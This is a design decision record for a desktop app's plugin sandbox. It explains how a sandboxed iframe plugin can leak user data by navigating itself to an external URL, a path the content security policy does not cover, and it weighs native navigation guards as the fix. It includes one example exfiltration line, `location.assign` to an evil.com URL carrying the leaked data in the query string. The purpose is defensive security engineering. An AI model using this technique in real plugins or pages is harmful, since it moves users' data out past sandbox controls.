# ADR — Closing the plugin self-navigation egress gap (spec §10 / H1)

**Status:** Open decision + Phase 0.1 landed. Date: 2026-06-26. Owner: v5 / Sub-project B.
**Context docs:** [design spec §4, §10](2026-06-25-v5-plugin-runtime-design.md) · [B plan Phase 0](../plans/2026-06-25-v5-subproject-B-marketplace-backend.md).

## The gap (restated precisely)

A plugin runs in `<iframe sandbox="allow-scripts">` with a strict CSP. The CSP wall
blocks all *resource* egress (`connect-src 'none'` ⇒ no `fetch`/XHR/WebSocket, no
remote `src`). It does **not** block the frame **navigating itself** to an external
URL: `location.assign("https://evil.com/?leak=" + data)` issues a top-level GET for
that iframe's own browsing context, carrying data in the query string. CSP has no
directive that stops this (`navigate-to` was removed from CSP3; `default-src`/
`connect-src` do not apply to navigations; `sandbox` has no "no self-navigation"
flag). The data is gone the instant the request leaves, regardless of what loads.

Exploit precondition: the plugin must already hold user-handed data (e.g. a file the
user picked via the Tier-1 `file.read` broker). Conspicuous (it destroys its own UI)
but real. **It is a Blocker before Sub-project B distributes *untrusted* plugins.**

## Why the obvious fix is not enough

The only layer that can veto a navigation is the **native webview**, not the page.
Tauri exposes `WebviewWindowBuilder::on_navigation(|url| …)`, which maps to the
**top-level** navigation event of a webview (WebView2 `NavigationStarting`,
WKWebView `decidePolicyForNavigationAction`, WebKitGTK `decide-policy`). Our plugin
is an **`<iframe>` sub-frame inside the main webview**, and on WebView2 sub-frame
navigations fire a **separate** event (`FrameNavigationStarting`) that Tauri's
`on_navigation` does **not** surface. So a main-webview navigation guard does **not**
close H1 for the iframe model — implementing only that would give false confidence.
(The main window is also created statically from `tauri.conf.json`, so there is no
`WebviewWindowBuilder` to attach a handler to without moving window creation to Rust.)

## Options

1. **Per-plugin dedicated locked-down Tauri webview** (spec "Approach 3"). Render each
   launched plugin in its own `WebviewWindow`/child webview loading
   `plugin://<id>/<entry>`, built with `on_navigation(|u| u.scheme() == "plugin")`.
   The guard now governs that webview's **top-level** navigation → portable + airtight
   across all three platforms. Cost: replaces A's `<iframe>` mount; the host↔plugin
   transport moves from `iframe.postMessage` to cross-webview IPC (Tauri events), so
   A's broker/SDK wire layer needs a shim. A's isolation core (opaque origin, broker
   default-deny, message-source auth, storage namespacing) is unchanged in spirit.
2. **Keep the iframe; intercept `FrameNavigationStarting` natively.** Use Tauri
   `with_webview` to reach the raw `ICoreWebView2`, subscribe to
   `FrameNavigationStarting`, and `Cancel` any navigation whose scheme isn't
   `plugin`/`about`/`blob`/`ipc`. Smallest change to A. Cost: **Windows-only** COM
   plumbing via `webview2-com` (macOS/Linux need their own `WKNavigationDelegate` /
   `decide-policy` handlers), and per-frame subscription wiring is fiddly.
3. **Accept the residual; gate by review only.** Rely on Sub-project D (static scan +
   monitored-sandbox dynamic pass) to reject self-navigation attempts, and never mark
   the network claim stronger than "no fetch/XHR/WebSocket egress." Rejected as the
   *primary* control: the runtime is supposed to be the boundary, D is defense-in-depth.

## Recommendation

**Option 1 (dedicated webview) as the production isolation model, with Option 2 as a
Windows-only fast path if the webview pivot proves too invasive this cycle.** Option 1
is the only portable, airtight closure and it aligns with the spec's stated Approach 3
fallback. Sequence it as the first real task of B Phase 0 *after* the asset protocol
(0.1, landed), because it changes how the host mounts/communicates with plugins and
therefore touches A's broker wiring.

## What this needs that can't be done headlessly

The choice between 1 and 2, and verification that the chosen guard actually refuses
`location.assign("https://example.com")` while the frame stays put, **requires a live
Tauri session** (`pnpm dev` → Marketplace) — the same "one manual check left" class as
A's iframe-render check. A checked-in manual repro (a tiny bundled plugin that attempts
self-navigation on a button click) is the acceptance artifact, per B plan Task 0.2 Step 2.

## What landed now (Phase 0.1)

- `plugin://` asset protocol (`apps/desktop/src-tauri/src/plugins/`) serving the local
  install cache, with the strict plugin CSP attached as a **response header** (the
  network wall for the production `src="plugin://…"` path, which bypasses A's srcDoc
  `<meta>` injection). Pure logic (traversal-safe paths, URI parsing, MIME, the CSP
  string) extracted to the no-Tauri `plugin-host` crate so the security tests run in CI
  and locally (14 tests green); the Tauri handler + active-version registry are the glue.
- **Not yet done (this ADR's subject):** the navigation guard itself (Option 1/2) and
  its live verification. Until it lands, B must not flip any *untrusted* plugin to
  installable; the bundled/dev example (trusted) remains srcDoc and is unaffected.
